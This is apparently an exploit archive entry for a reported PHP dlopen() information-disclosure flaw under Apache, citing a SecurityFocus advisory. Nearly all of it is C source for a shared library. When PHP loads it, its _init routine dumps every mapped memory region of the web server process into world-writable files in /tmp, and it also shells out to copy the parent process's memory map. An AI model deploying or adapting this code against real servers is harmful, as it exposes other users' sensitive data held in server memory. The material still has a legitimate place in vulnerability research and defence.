source: http://www.securityfocus.com/bid/8405/info
 
A vulnerability has been reported to present itself in the dlopen() function contained in the PHP source. The issue occurs when PHP is used in conjunction with the Apache web server. A local attacker may exploit this issue to gain unauthorized access to potentially sensitive information.

/* 
 * http://felinemenace.org/ - Local PHP fun stuff - andrewg
 * Under linux, this will dump the processes memory into /tmp. Its useful for
 * several things.
 */

#include <stdlib.h>
#include <stdio.h>
#include <assert.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <errno.h>

int bd_fd=0;

void trace(char *string)
{
	char buf[32];
	
	if(bd_fd == 0) {
		sprintf(buf, "/tmp/tracez.%d", getpid());
		bd_fd = open(buf, O_WRONLY|O_CREAT|O_TRUNC|O_SYNC, 0777);
		if(bd_fd == -1) {
			system("echo fscking damnit. unable to open file > /tmp/trace");
			exit(EXIT_FAILURE);
		}
	}
	write(bd_fd, string, strlen(string));
}

void _init()
{
	char cmd[1024], cmd2[1024];
	int fd;
	unsigned int start, stop;
	FILE *f;
	
	sprintf(cmd, "Starting up: pid %d\n", getpid());
	system("cat /proc/$PPID/maps > /tmp/t");
	trace(cmd);
	
	f = fopen("/proc/self/maps", "r");
	while(fgets(cmd2, sizeof(cmd2)-1, f)) {
		trace("read: ");
		trace(cmd2);
		sscanf(cmd2,"%08x-%08x \n", &start, &stop);
		sprintf(cmd, "\nStart: %p, Stop: %p\n", start, stop);
		trace(cmd);
		sprintf(cmd, "/tmp/memdump.%p", start);
		trace("saving data to ");
		trace(cmd);
		trace("\n");
		if((fd = open(cmd, O_WRONLY|O_CREAT|O_TRUNC, 0777)) < 0) {
			trace("Unable to open file.\n");
		} else {
			write(fd, start, stop - start);
			close(fd);
		}
	}

	fclose(f);
	
	trace("\n--> should be done now\n");
	
}

void _fini()
{
	close(bd_fd);
}